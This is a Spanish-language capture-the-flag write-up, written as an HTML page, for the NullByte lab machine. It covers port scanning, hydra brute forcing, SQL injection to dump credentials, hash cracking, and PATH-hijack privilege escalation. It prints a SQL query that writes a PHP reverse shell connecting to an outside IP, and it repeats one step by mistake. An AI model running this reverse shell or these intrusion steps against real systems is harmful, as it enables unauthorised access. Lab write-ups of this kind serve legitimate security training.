@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JisCTF Writeup</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Roboto', sans-serif; /* Cambia la fuente a Roboto */
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        pre {
+            background-color: #222;
+            color: #fff;
+            padding: 10px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>NullByte</h1>
+
+        <p><i class="fa fa-clock-o"></i> Posted on February 28, 2024</p>
+        <p>&#10095; Hacemos un escaneo de puertos con nmap.</p>
+        <pre><code>
+nmap -p- --open -n --min-rate 5000 -sVC -Pn -vvv ipVcictima -oN targeted
+        </code></pre>
+        <img src="./imagenes/NullByte/nmap.png" alt="Description of your first image">
+        <p>&#10095; Entramos al puerto 80 y vemos esta imagen, le pasamos exiftool y encontramos lo que parece ser una password.</p>
+        <img src="./imagenes/NullByte/imagenexiftool.png" alt="Description of your second image">
+        <img src="./imagenes/NullByte/exiftool.png" alt="Description of your second image">
+        <p>&#10095; Descubrimos que es un directorio, entramos y nos pide una key.</p>
+        <img src="./imagenes/NullByte/directorio.png" alt="Description of your second image">
+        <p>&#10095; Al mirar el codigo fuente encontramos un mensaje que nos dice que la contraseñá es debil.</p>
+        <img src="./imagenes/NullByte/codigofuente.png" alt="Description of your second image">
+        <p>&#10095; Hacemos un ataque de fuerta bruta con <code>hydra</code> y encontramos una contraseña.</p>
+        <img src="./imagenes/NullByte/hydra.png" alt="Description of your second image">
+        <p>&#10095; Introducimos la contraseña en el campo key y nos lleva a otra pagina.</p>
+        <p>&#10095; Vemos un campo que nos pide un nombre de usuario, hacemos una peticion y la interceptamos con <code>burpsuite</code>.
+        Enviamos la peticion al repetear, cambiamos el motodo de envio a <code>POST</code> y al enviarla vemos dos usuarios</p>
+        <img src="./imagenes/NullByte/burpsuite.png" alt="Description of your second image">
+        <p>&#10095; En la url introducimos isis por ejemplo y unas comillas dobles, vemos que nos da un error de <code>MySQL</code>.</p>
+        <img src="./imagenes/NullByte/isis.png" alt="Description of your second image">
+        <p>&#10095; Descubrimos con <code>order by</code> que hay 3 columnas y que la columna 3 es vulnerable a la inyeccion.
+        Listamos el nombre de la base de datos actualmente en uso</p>
+        <img src="./imagenes/NullByte/database.png" alt="Description of your second image">
+        <p>&#10095; Ahora desde <code>burpsuite</code> mas comodamente listamos todas las bases de datos existentes.</p>
+        <img src="./imagenes/NullByte/burpsuite2.png" alt="Description of your second image">
+        <p>&#10095; Listamos las tablas de la base de datos <code>seth</code> y vemos una tabla <code>users</code>.</p>
+        <img src="./imagenes/NullByte/burpsuite3.png" alt="Description of your second image">
+        <p>&#10095; Listamos las columnas de la tabla <code>users</code> de la base de datos <code>seth</code> separado por comas.</p>
+        <img src="./imagenes/NullByte/burpsuite4.png" alt="Description of your second image">
+        <p>&#10095; Volcamos los datos de las columnas y vemos hash en base64 del usuario <code>ramses</code>.</p>
+        <img src="./imagenes/NullByte/burpsuite5.png" alt="Description of your second image">
+        <p>&#10095; La decodeamos y nos queda un hash MD5.</p>
+        <img src="./imagenes/NullByte/base64.png" alt="Description of your second image">
+        <p>&#10095; La decodeamos y obtenemos una credencial.</p>
+        <img src="./imagenes/NullByte/md5.png" alt="Description of your second image">
+        <p>&#10095; Si comprobamos la credencial con hydra vemos que podemos conecctarnos al puerto <code>777 ssh</code> pero 
+        en este writeup vamos a acceder al sistema de otra forma alternativa.</p>
+        <img src="./imagenes/NullByte/hydraRamses.png" alt="Description of your second image">
+        <p>&#10095; Si volvemos a <code>burpsuite</code>y volcomas las credenciales mysql.user vemos que encontramos el hash de <code>root</code>.</p>
+        <img src="./imagenes/NullByte/burpsuite6.png" alt="Description of your second image">
+        <p>&#10095; Comprobamos que tipo de hash es con la herramienta <code>hash-id</code>, vemos que es <code>SHA-1</code>.</p>
+        <img src="./imagenes/NullByte/hashID.png" alt="Description of your second image">
+        <p>&#10095; Vamos a <code>crackstation</code> y obtenemos una password.</p>
+        <img src="./imagenes/NullByte/crackstation.png" alt="Description of your second image">
+        <p>&#10095; La decodeamos y nos queda un hash MD5.</p>
+        <img src="./imagenes/NullByte/base64.png" alt="Description of your second image">
+        <p>&#10095; Nos vamos al directorio <code>phpmyadmin</code> y nos conectamos con el usuario <code>root</code> y la password.</p>
+        <img src="./imagenes/NullByte/phpmyadminLogin.png" alt="Description of your second image">
+        <img src="./imagenes/NullByte/phpmyadmin.png" alt="Description of your second image">
+        <p>&#10095; Escribimos esta query en el campo SQL para que nos cree un archivo <code>shell.php</code> con una revershell 
+        en el directorio <code>uploads</code> y recibimos una shell como <code>www-data</code>.</p>
+        <pre><code>
+SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.45.248/443 0>&1\"');" into outfile "/var/www/html/uploads/shell.php"
+        </code></pre>
+        <img src="./imagenes/NullByte/query.png" alt="Description of your second image">
+        <p>&#10095; Nos ponemos en escucha con <code>netcat</code> y al entrar a nuestro archivo <code>shell.php</code> recibimos
+        una revershell por nuestro puerto en escucha.</p>
+        <img src="./imagenes/NullByte/shellPHP.png" alt="Description of your second image">
+        <img src="./imagenes/NullByte/netcat.png" alt="Description of your second image">
+        <h1>Escalada de Privilegios</h1>
+        <p>&#10095; Buscamos por binarios SUID y encontramos uno sospechoso.</p>
+        <img src="./imagenes/NullByte/procwatch.png" alt="Description of your second image">
+        <p>&#10095; Si lo ejecutamos vemos que parece estar ejecutando el comando <code>sh</code> y el comando <code>ps</code>.</p>
+        <img src="./imagenes/NullByte/procwatchExecution.png" alt="Description of your second image">
+        <p>&#10095; Nos vamos al directorio /tmp y nos creamos un archivo de nombre <code>sh</code> y otro de nombre <code>ps</code>.
+        Dentro de cada archivo tenemos que indicarle que queremos cambiar el permiso de la bash a <code>SUID</code>.</p>
+        <img src="./imagenes/NullByte/cat.png" alt="Description of your second image">
+        <p>&#10095; Ahora modificamos el <code>PATH</code> para que empiece a buscar por el directorio <code>/tmp/</code>,
+        de esta forma cuando ejecutemos el binario <code>procwatch</code> y esto ejecute el comando <code>ps y sh</code>
+        se ejecutaran primero nuestros comandos maliciosos y le cambiremos los privilegios a la bash</p>
+        <img src="./imagenes/NullByte/path.png" alt="Description of your second image">
+        <p>&#10095; Una vez ejecutado el binario <code>procwatch</code> si listamos los permisos de la bash vemos que es <code>SUID</code>.
+        Nos lanzamos una bash como <code>root</code>.</p>
+        <img src="./imagenes/NullByte/root.png" alt="Description of your second image">
+        <br> <!-- Salto de línea -->
+        <br> <!-- Salto de línea -->
+       <img src="./imagenes/jisctf/pwned.png" alt="Description of your second image">
+    </div>
+</body>
+</html>
